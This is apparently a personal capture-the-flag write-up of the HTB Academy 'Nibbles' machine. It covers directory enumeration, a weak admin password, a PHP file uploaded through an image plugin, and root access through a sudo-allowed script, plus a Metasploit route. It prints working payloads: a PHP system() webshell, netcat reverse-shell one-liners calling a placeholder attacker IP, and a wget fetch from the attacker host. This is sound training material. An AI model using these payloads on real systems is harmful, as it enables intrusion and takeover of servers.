# Nibbles
Nibbles is a simple machine where the user is given a url to a web application. Participants are expected to showcase common enumeration tactics, basic web application exploitation, and file-related misconfigurations to escalate privileges. Nibbles is given to us to complete as part of the Certified Penetration Testing Specialist pathway on HTB Academy. 

I will be documenting my thought process along with steps I am taking to reach the endgoal of exploiting the system and obtaining root access. 

At the end I will also show an alternate foothold method using Metasploit. 

## Approach

I first enter the URL into the browser and am greeted with a basic 'Hello World' in plaintext

![image](https://github.com/b-obby/HTB-walkthroughs/assets/157441224/ca910484-32c6-42dc-94a6-48772955ce0f)

Since this doesn't provide us much information, I check the web application's source code. 

![image](https://github.com/b-obby/HTB-walkthroughs/assets/157441224/8883eeb1-bcea-40a3-8c56-139e1b648918)

It seems that our web dev left us some breadcrumbs commented in. I visited the /nibbleblog web directory to find the following landing page: 

![image](https://github.com/b-obby/HTB-walkthroughs/assets/157441224/d6ae5e90-2a10-4517-a201-ab27ed92b6f8)

The only information we really get from this page is that this page is powered by Nibbleblog. We can later try to use this information if we want to directly find an exploit associated with this blog hosting service. 

Let's try a gobuster scan to see if we can enumerate any additional web directories within /nibbleblog. I used the common.txt wordlist that is included with the tool:

```
gobuster dir -u <url/nibbleblog> --wordlist /usr/share/dirb/wordlists/common.txt
```

![image](https://github.com/b-obby/HTB-walkthroughs/assets/157441224/6c8aab84-15aa-442c-a2be-b8cf27f19fc6)

We were successfully able to find some additional directories. At this point I will explore to see if there's an exploit opportunity. 

I first tried /admin.php which resulted in a login page. With a stroke of luck I was actually able to log in due to weak credentials `admin : nibbles` 

> My logic behind this guess is that admin is a common user, and Nibbles was a word we've seen when visitng the original /nibbleblog directory. Lucky me :)
> It is also worth noting that there was a users.xml file within /nibbleblog/content that also listed Admin as a user. I ended up finding this afterwards. 

> If I was not as fortunate, I would have to run an offline password brute forcing tool such as hashcat, as hydra would not be feasable as we are instructed that this box limits the amount of login attempts per IP address
> I will eventually develop a custom script that functions like hydra but with IP spoofing / proxies to avoid IP blocks. 

Snooping around the admin portal I noticed that there are plugins. More importantly, I noticed that there's an opportunity for us to attempt RCE; this is because one of the plugins enables us to upload an image. 

![image](https://github.com/b-obby/HTB-walkthroughs/assets/157441224/9bfc7fe5-084a-4757-88b7-c750bddc97fd)

> But of course, as a pentester, we aren't actually uploading images, we're uploading payloads.

Circling back to our directory enumeration, there was actually a plugins directory. After giving it a look we are greeted with a bunch of folders, one of them being `my_image/` which is potentially where our uploaded RCE attempt would be stored.  

![image](https://github.com/b-obby/HTB-walkthroughs/assets/157441224/8cad5b0f-b761-4d64-bee9-ebafb3424722)


## Getting a Foothold

Now that we have some idea of how we could potentially gain a foothold into the system, let's generate a tester payload featuring a very simple request.

Using `nano` I created a file named `image.php` on my system with the following payload pasted inside: 
```
<?php system('id'); ?>
``` 

I then uploaded it on the admin portal. The attempt was successfull; it seems that the nibbleblog plugin does not validate file inputs for .jpg, .png, or other actual image formats.

Now we have to search for where our file uploaded to execute the payload. 

Going back to our plugins/my_image folder, I couldn't find it. This means that there's another directory where our image is being stored.
Looking back at my gobuster enumration, there was a /content directory. Looking inside there led me to another plugins folder, which also has its own `my_image` folder.  

![image](https://github.com/b-obby/HTB-walkthroughs/assets/157441224/1f0b2c79-c340-485f-a7d3-e4e1b6615c75)

![image](https://github.com/b-obby/HTB-walkthroughs/assets/157441224/441435c2-b66d-4ea1-b3ee-7263d9a5b692)

Lucky for us, we were able to find our uploaded file here. 

Attempting to open the file gives us the following output:

![image](https://github.com/b-obby/HTB-walkthroughs/assets/157441224/6f9c0403-3331-4c20-9cc0-4efc49e980d0)

This means that our payload actually works, as it was designed to confirm the identity of the linux user. 

Now that we know we can attack via RCE, I am now crafting an actual payload. The payload will set up a reverse shell allowing us to dig deeper into the target. 

```
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <MY IP> <port>  >/tmp/f"); ?>
``` 

> I replace the < MY IP > and <PORT> with my attacking system's IP address and a port I'd like to catch the reverse shell on. 

We also need to set up a netcat listener on our attacking system: 
```
nc -nvlp <port>
``` 

I then go through the file upload process again and open our updated image within the /content/my_image folder. 

![image](https://github.com/b-obby/HTB-walkthroughs/assets/157441224/2de247c8-7b8e-4907-a52a-e6083a7c8a0c)

Looks like it worked! Our netcat listener caught the shell. 
It seems like our shell is very basic, so I'd like to upgrade it so we can get some work done.

``` 
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image](https://github.com/b-obby/HTB-walkthroughs/assets/157441224/b7350c0a-7d6b-4d34-a8d9-1fc0bf91f30f)

Now that we've upgraded our shell, let's try to find a flag. 

I run a `whoami` command to see who the user is, we are `nibbler` 

I want to see what's in nibbler's home directory, so I change directories with `cd /home/nibbler` 

I then use the `ls` command to list the files in the home directory. 

![image](https://github.com/b-obby/HTB-walkthroughs/assets/157441224/88a8a6d0-2411-4a30-8bf0-7559a4dfa815)

Seems like we have two options to investigate, personal.zip and user.txt

User.txt is the low hanging fruit so let's cat the file to see what's going on in there

`cat user.txt` 

![image](https://github.com/b-obby/HTB-walkthroughs/assets/157441224/4bc8106a-6e53-452f-ab2d-465b9f80564b)

Looks like we've obtained our first flag! 

## Privilege Escalation

Now that we've found the first flag, let's now try to escalate to root. 

We did have another file on hand, which was personal.zip. Let's unpack it and see what's inside using the command 

`unzip personal.zip`

After unzipping the files we are given a file named `monitor.sh` Maybe we can use this to help us to get to root.

> Before doing so, I set up a simple http webserver on my attacking system to have our target install a LinEnum script.
> The purpose of LinEnum is to see if I am able to run any sudo commands on the target
>>`sudo python3 -m http.server 8080`
>>
>I then use the following command on our target to install the LinEnum that is on my desktop:
>>`wget <my ip>:8080/linenum.sh`
>>
>Our target has now downloaded linenum.sh from my system. To run it, we need to do turn it into an executable file using chmod. 
>>`chmod +x linenum.sh`
>>
>Executing the file with the command `./linenum.sh` we are told that nibbler can run a command as sudo:
>>`/home/nibbler/personal/stuff/monitor.sh`
>>
>This means that we can execute montitor.sh as sudo. 

>It's good to note that we didn't *have* to run linenum and we could've just tried running the script as sudo through a random guess, but linenum could've found additional sudo commands for us to escalate through. 

Going back to the file, let's add our reverse shell payload to the very end of the script. 

```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <my ip> <port> >/tmp/f' | tee -a monitor.sh
```
> It is good practice to put our injects at the END of files because this enables us to clean up quick after the penetration assessment is over. 

I then set up a second netcat listener on my attacking system and execute the file

`sudo /home/nibbler/personal/stuff/monitor.sh`

![image](https://github.com/b-obby/HTB-walkthroughs/assets/157441224/678f5ec4-4e92-45b2-9ab2-80004eb26c7a)

We caught a connection, and after checking with whoami we've confirmed that we are in root!!

I then went to the root directory using `cd /root` and listed the files using `ls` 

We are given a root.txt file. After using cat to see what's inside, we have obtained our final flag!!

![image](https://github.com/b-obby/HTB-walkthroughs/assets/157441224/d656d0aa-1a22-492a-9e2e-30d0e2175abf)


## Alternative: Using Metasploit to obtain a footdoor

> In order for this to work, we need to already know the credentials for the admin portal

I mentioned earlier that we could try to see if nibblerblog has any publicly known vulnerabilties. The metasploit framework is a great tool for identifying publicly known exploits. 

Let's run metasploit using the command `msfconsole`

It may take a while to load, but once it's ready let's search for nibbleblog exploits.

`search exploit nibbleblog` 

![image](https://github.com/b-obby/HTB-walkthroughs/assets/157441224/30b738f6-465c-434d-a372-88946985b95c)

We see that there is one exploit available for nibbleblog, so let's see if we can use it against our target. 
First, let's learn more about the exploit in the database using the 'info 0' command.
![image](https://github.com/b-obby/HTB-walkthroughs/assets/157441224/a88135eb-32fa-4df2-8561-b33fc33a57ae)

We now know that this is a file upload vulnerability, similar to the initial foothold we did earlier. 

We are also shown the parameters required to successfully execute this exploit. 
> Any parameters with 'Yes' in the required column indicates that we must set these values.


Let's use our exploit with the `use 0` command. Before we begin we need to set some parameters based on what we've learned from info. 

```
* Set password nibbles
* Set username admin
* Set RHOSTS <target IP>
* Set LHOST <attacker IP>
* Set TARGETURI nibbleblog
```

We can use `show options` to check our updated parameters
![image](https://github.com/b-obby/HTB-walkthroughs/assets/157441224/ce5daa0b-c886-4dab-97fd-ba34b7d4f956)


Everything looks good, now we can start our exploit by typing `exploit` into the console

![image](https://github.com/b-obby/HTB-walkthroughs/assets/157441224/87f59149-cb51-474a-a040-ba5bc03aabba)

We have successfully obtained a foothold into the system. We are now able to interact with the reverse shell like earlier in this documentation and follow the same steps to obtain our user and root flags. 

> You can also use the same python3 command from earlier to upgrade your shell. 


# Final Thoughts 

Nibbles was a very simple yet fun activity to practice with. I really enjoyed creating this writeup as well as it will prepare me to take adequate notes for the reporting process once I am a full fledged penetration tester. 
I will definitely be using the techniques obtained from this lab in my future web application penetration tests. 

If you've made it this far, I appreciate your time. If you're a recruiter or employer, I hope this showcases some of my thought process, skillset, and passion for learning. If you're a random person who's stumbled upon this repository for help with Nibbles, I hope I was able to provide the help you were seeking! 

Surpass your limits!

-Bobby 






